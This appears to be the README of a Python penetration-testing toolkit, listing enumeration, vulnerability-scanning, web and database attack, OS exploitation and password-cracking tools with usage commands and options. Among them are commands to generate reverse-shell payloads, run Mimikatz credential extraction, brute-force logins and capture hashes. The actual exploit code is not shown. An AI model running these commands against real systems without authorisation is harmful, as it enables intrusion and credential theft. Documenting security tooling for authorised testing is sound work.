# Huginn Enumeration Tools

Python-based enumeration and vulnerability scanning tools for penetration testing.

## Available Tools

### 1. Port Scanner (`port_scanner.py`)

- TCP connect scans, network sweeps, service detection

### 2. SMB Enumerator (`smb_enum.py`)

- SMB/NetBIOS enumeration, OS detection

### 3. SMTP Enumerator (`smtp_enum.py`)

- User enumeration via VRFY/EXPN/RCPT TO

### 4. SNMP Enumerator (`snmp_enum.py`)

- Community testing, SNMP walks

### 5. HTTP Enumerator (`http_enum.py`)

- Server fingerprinting, SSL analysis, directory scanning

### 6. API Enumerator (`api_enum.py`)

- Endpoint discovery, method testing, auth bypass

### 7. Database Enumerator (`db_enum.py`)

- Database port scanning, service detection

### 8. Vulnerability Scanner (`nse_vuln_scanner.py`)

- Heartbleed detection, HTTP vulnerabilities, SMB checks, SSL/TLS analysis

### 9. Web Exploits (`web_exploits.py`)

- XSS testing, LFI/RFI, directory traversal, command injection, CSRF token extraction

### 10. Database Attacks (`db_attacks.py`)

- SQL injection testing, blind SQL, UNION attacks, MSSQL/MySQL exploitation

### 11. OS Exploits (`os_exploits.py`)

- Windows service enumeration, DLL hijacking, Pass-the-Hash, Linux privilege escalation

### 12. Cracking Tools (`cracking_tools.py`)

- Hashcat hash cracking, John the Ripper, Hydra brute force, Responder hash capture

## Usage Examples

```bash
# Port scanning
python port_scanner.py 192.168.1.1 --top-ports 20
python port_scanner.py 192.168.1.0 --sweep

# SMB enumeration
python smb_enum.py 192.168.1.1 --netbios
python smb_enum.py 192.168.1.1 --os-detect

# SMTP enumeration
python smtp_enum.py mail.example.com --domain example.com

# SNMP enumeration
python snmp_enum.py 192.168.1.1 --community public --walk

# HTTP enumeration
python http_enum.py example.com --dir-scan
python http_enum.py example.com --https --ssl-scan

# API enumeration
python api_enum.py api.example.com --methods
python api_enum.py api.example.com --auth-bypass

# Database enumeration
python db_enum.py 192.168.1.1 --detailed

# Vulnerability scanning
python nse_vuln_scanner.py 192.168.1.1 --all
python nse_vuln_scanner.py 192.168.1.1 --common --port 443
python nse_vuln_scanner.py 192.168.1.1 --cve CVE-2021-41773
python nse_vuln_scanner.py --list

# Web application exploits
python web_exploits.py http://example.com --all
python web_exploits.py http://example.com --xss
python web_exploits.py http://example.com --lfi --rfi
python web_exploits.py http://example.com --dir-traversal
python web_exploits.py http://example.com --cmd-inject
python web_exploits.py http://example.com --csrf-tokens

# Database attacks
python db_attacks.py http://example.com --all
python db_attacks.py http://example.com --sql-inject
python db_attacks.py http://example.com --blind-sql
python db_attacks.py http://example.com --union-sql
python db_attacks.py 192.168.1.1 --mssql --username sa --password password
python db_attacks.py 192.168.1.1 --mysql --username root --password password

# OS exploits
python os_exploits.py localhost --all
python os_exploits.py 192.168.1.1 --windows-services
python os_exploits.py localhost --dll-hijacking
python os_exploits.py localhost --mimikatz
python os_exploits.py localhost --linux-privesc
python os_exploits.py localhost --reverse-shell 192.168.1.100:4444

# Password cracking
python cracking_tools.py --hashcat hash.txt --hash-mode 1000
python cracking_tools.py --john hash.txt --wordlist rockyou.txt
python cracking_tools.py --hydra 192.168.1.1 --service ssh --username admin
python cracking_tools.py --responder eth0
python cracking_tools.py --identify-hash 5d41402abc4b2a76b9719d911017c592
python cracking_tools.py --show-rules
```

## Vulnerability Scanner Options

- `--all`: Run all vulnerability tests
- `--common`: Scan for common vulnerabilities
- `--cve CVE-XXXX-XXXX`: Test specific CVE (Heartbleed, CVE-2021-41773)
- `--port N`: Target specific port
- `--list`: List available vulnerability tests
- `--timeout N`: Connection timeout in seconds

## Web Exploits Options

- `--all`: Run all web exploit tests
- `--xss`: Test for Cross-Site Scripting
- `--lfi`: Test for Local File Inclusion
- `--rfi`: Test for Remote File Inclusion
- `--dir-traversal`: Test directory traversal
- `--cmd-inject`: Test command injection
- `--csrf-tokens`: Extract CSRF tokens and nonces
- `--file-upload URL`: Test file upload vulnerabilities
- `--brute-login URL`: Brute force login forms

## Database Attacks Options

- `--all`: Run all database attack tests
- `--sql-inject`: Test for SQL injection
- `--blind-sql`: Test for blind SQL injection
- `--union-sql`: Test for UNION-based SQL injection
- `--mssql`: Test MSSQL connection and exploitation
- `--mysql`: Test MySQL connection and exploitation
- `--username USER`: Database username
- `--password PASS`: Database password
- `--parameter PARAM`: Parameter to test for SQL injection

## OS Exploits Options

- `--all`: Run all OS exploitation tests
- `--windows-services`: Enumerate Windows services
- `--windows-tasks`: Enumerate scheduled tasks
- `--dll-hijacking`: Check DLL hijacking opportunities
- `--pass-the-hash HASH`: Pass-the-Hash attack examples
- `--keepass`: KeePass database enumeration
- `--mimikatz`: Mimikatz credential extraction commands
- `--linux-privesc`: Linux privilege escalation enumeration
- `--linux-cron`: Linux cron job enumeration
- `--reverse-shell IP:PORT`: Generate reverse shell payloads
- `--library-attack IP`: Windows Library file attack

## Cracking Tools Options

- `--hashcat FILE`: Run hashcat on hash file
- `--john FILE`: Run John the Ripper on hash file
- `--hydra TARGET`: Run Hydra brute force attack
- `--responder INTERFACE`: Start Responder for hash capture
- `--identify-hash HASH`: Identify hash type
- `--create-rule FILE`: Create custom rule file
- `--show-rules`: Display common password mutation rules
- `--hash-mode MODE`: Hashcat hash mode (default: 0)
- `--wordlist FILE`: Wordlist file path
- `--rule-file FILE`: Rule file for hashcat
- `--service SERVICE`: Service for Hydra (ssh, ftp, rdp, etc.)
- `--username USER`: Username for brute force
- `--password PASS`: Password for brute force
